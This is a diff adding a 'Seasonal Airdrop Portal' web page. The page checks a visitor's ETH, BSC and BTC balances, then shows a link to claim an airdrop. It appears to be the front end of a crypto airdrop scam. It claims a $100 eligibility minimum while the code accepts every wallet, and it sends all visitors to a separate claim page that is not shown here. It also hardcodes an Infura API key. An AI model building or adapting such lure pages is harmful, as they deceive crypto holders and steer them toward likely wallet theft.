@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Seasonal Airdrop Portal</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(to bottom right, #4b0082, #800080);
+      font-family: Arial, sans-serif;
+      color: white;
+      text-align: center;
+      overflow: hidden;
+      perspective: 1000px;
+    }
+    h1 {
+      margin-top: 60px;
+      font-size: 2.5em;
+    }
+    p {
+      font-size: 1.2em;
+    }
+    #walletInput {
+      margin: 30px auto;
+      padding: 10px;
+      font-size: 1em;
+      width: 300px;
+      border-radius: 8px;
+      border: none;
+      outline: none;
+      box-shadow: inset 0 0 8px #0d1117, 0 0 8px #58a6ff;
+      transition: box-shadow 0.4s ease;
+      background-color: #1e1e2f;
+      color: #e0e0ff;
+    }
+    #checkBtn {
+      padding: 10px 20px;
+      font-size: 1em;
+      border-radius: 5px;
+      border: none;
+      background: #28a745;
+      color: white;
+      cursor: pointer;
+      box-shadow: 0 0 10px #2ea043, 0 0 20px #238636;
+      transition: box-shadow 0.5s ease;
+    }
+    #result {
+      margin-top: 20px;
+      font-weight: bold;
+      min-height: 1.5em;
+    }
+    #linkBtn {
+      display: none;
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 1em;
+      border-radius: 5px;
+      background: gold;
+      color: black;
+      text-decoration: none;
+      font-weight: bold;
+      box-shadow: 0 0 10px gold;
+      transition: box-shadow 0.3s ease;
+    }
+    #linkBtn:hover {
+      box-shadow: 0 0 20px gold;
+    }
+    .coin {
+      position: absolute;
+      width: 40px;
+      height: 40px;
+      background: url('https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=029') no-repeat center center;
+      background-size: contain;
+      animation: fall linear infinite;
+      transform-style: preserve-3d;
+    }
+    @keyframes fall {
+      0% {
+        transform: translateY(-100px) rotateY(0deg) rotateX(0deg);
+        opacity: 1;
+      }
+      100% {
+        transform: translateY(100vh) rotateY(720deg) rotateX(360deg);
+        opacity: 0;
+      }
+    }
+
+    /* New Web3 glow pulse animation */
+    @keyframes glowPulse {
+      0% {
+        text-shadow:
+          0 0 5px #58a6ff,
+          0 0 15px #58a6ff,
+          0 0 30px #1f6feb;
+        color: #58a6ff;
+      }
+      100% {
+        text-shadow:
+          0 0 15px #a1c8ff,
+          0 0 35px #a1c8ff,
+          0 0 60px #1f6feb;
+        color: #a1c8ff;
+      }
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+  <h1>Welcome to the Seasonal Airdrop Portal</h1>
+  <p>⚠️ All wallet addresses must have an eligible balance of $100 </p>
+
+  <input id="walletInput" type="text" placeholder="Enter your wallet address" />
+  <button id="checkBtn">Check Eligibility</button>
+
+  <div id="result"></div>
+  <a id="linkBtn" href="/public/new.html">Proceed to Claim Airdrop</a>
+
+  <script>
+    const linkBtn = document.getElementById("linkBtn");
+    const result = document.getElementById("result");
+    const MIN_USD = 0; // Allow all wallets
+
+    // Public RPC URLs for Ethereum and BSC
+    const ETH_RPC = "https://mainnet.infura.io/v3/7b28734fdc7e4e948cb014aef52b0947"; // Replace if needed
+    const BSC_RPC = "https://bsc-dataseed.binance.org/";
+
+    async function getEthBalance(address) {
+      try {
+        const provider = new ethers.providers.JsonRpcProvider(ETH_RPC);
+        const balanceBigInt = await provider.getBalance(address);
+        return parseFloat(ethers.utils.formatEther(balanceBigInt));
+      } catch (e) {
+        console.error("ETH balance fetch error:", e);
+        return 0;
+      }
+    }
+
+    async function getBscBalance(address) {
+      try {
+        const provider = new ethers.providers.JsonRpcProvider(BSC_RPC);
+        const balanceBigInt = await provider.getBalance(address);
+        return parseFloat(ethers.utils.formatEther(balanceBigInt));
+      } catch (e) {
+        console.error("BSC balance fetch error:", e);
+        return 0;
+      }
+    }
+
+    async function getBtcBalance(address) {
+      try {
+        const res = await fetch(`https://blockchain.info/q/addressbalance/${address}?confirmations=3`);
+        if (!res.ok) throw new Error("BTC API error");
+        const sats = await res.text();
+        return parseFloat(sats) / 1e8;
+      } catch (e) {
+        console.error("BTC balance fetch error:", e);
+        return 0;
+      }
+    }
+
+    async function getPrices() {
+      try {
+        const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin&vs_currencies=usd");
+        if (!res.ok) throw new Error("Price API error");
+        return await res.json();
+      } catch (e) {
+        console.error("Price fetch error:", e);
+        return null;
+      }
+    }
+
+    document.getElementById("checkBtn").onclick = async function () {
+      const address = document.getElementById("walletInput").value.trim();
+      result.textContent = "Checking...";
+      linkBtn.style.display = "none";
+
+      const isETH = /^0x[a-fA-F0-9]{40}$/.test(address);
+      const isBTC = /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(address) || address.startsWith("bc1");
+
+      if (!isETH && !isBTC) {
+        result.textContent = "❌ Invalid wallet address.";
+        return;
+      }
+
+      const prices = await getPrices();
+      if (!prices) {
+        result.textContent = "❌ Error fetching prices.";
+        return;
+      }
+
+      let balanceUSD = 0;
+
+      if (isETH) {
+        const ethBalance = await getEthBalance(address);
+        balanceUSD += ethBalance * prices.ethereum.usd;
+
+        const bscBalance = await getBscBalance(address);
+        balanceUSD += bscBalance * prices.binancecoin.usd;
+      }
+
+      if (isBTC) {
+        const btcBalance = await getBtcBalance(address);
+        balanceUSD += btcBalance * prices.bitcoin.usd;
+      }
+
+      if (balanceUSD >= MIN_USD) {
+        result.textContent = `✅ Wallet eligible. Estimated value: $${balanceUSD.toFixed(2)}`;
+        linkBtn.style.display = "inline-block";
+      } else {
+        result.textContent = `❌ Wallet not eligible. Current value: $${balanceUSD.toFixed(2)}`;
+      }
+    };
+
+    function spawnCoin() {
+      const coin = document.createElement("div");
+      coin.className = "coin";
+      coin.style.left = Math.random() * 100 + "vw";
+      coin.style.animationDuration = 2 + Math.random() * 3 + "s";
+      document.body.appendChild(coin);
+      setTimeout(() => document.body.removeChild(coin), 5000);
+    }
+
+    setInterval(spawnCoin, 300);
+  </script>
+
+  <!-- New Web3 interactive styling script -->
+  <script>
+    const walletInput = document.getElementById("walletInput");
+    const checkBtn = document.getElementById("checkBtn");
+    const resultDiv = document.getElementById("result");
+
+    // Input glow pulse on focus and typing
+    walletInput.addEventListener("focus", () => {
+      walletInput.style.boxShadow = "inset 0 0 16px #58a6ff, 0 0 24px #58a6ff";
+    });
+
+    walletInput.addEventListener("blur", () => {
+      walletInput.style.boxShadow = "inset 0 0 8px #0d1117, 0 0 8px #58a6ff";
+    });
+
+    walletInput.addEventListener("input", () => {
+      walletInput.style.boxShadow = "inset 0 0 20px #58a6ff, 0 0 28px #58a6ff";
+      setTimeout(() => {
+        walletInput.style.boxShadow = "inset 0 0 12px #58a6ff, 0 0 15px #58a6ff";
+      }, 150);
+    });
+
+    // Button hover glow pulse
+    checkBtn.addEventListener("mouseenter", () => {
+      checkBtn.style.boxShadow = "0 0 20px #2ea043, 0 0 40px #238636";
+    });
+
+    checkBtn.addEventListener("mouseleave", () => {
+      checkBtn.style.boxShadow = "0 0 10px #2ea043, 0 0 20px #238636";
+    });
+
+    // Result glow pulse when eligible
+    function glowResult() {
+      if (resultDiv.textContent.startsWith("✅")) {
+        resultDiv.style.animation = "glowPulse 2s infinite alternate";
+      } else {
+        resultDiv.style.animation = "none";
+      }
+    }
+
+    // Wrap the original check button click handler to include glowResult call
+    const originalCheckHandler = checkBtn.onclick;
+    checkBtn.onclick = async function () {
+      await originalCheckHandler();
+      glowResult();
+    };
+  </script>
+</body>
+</html>
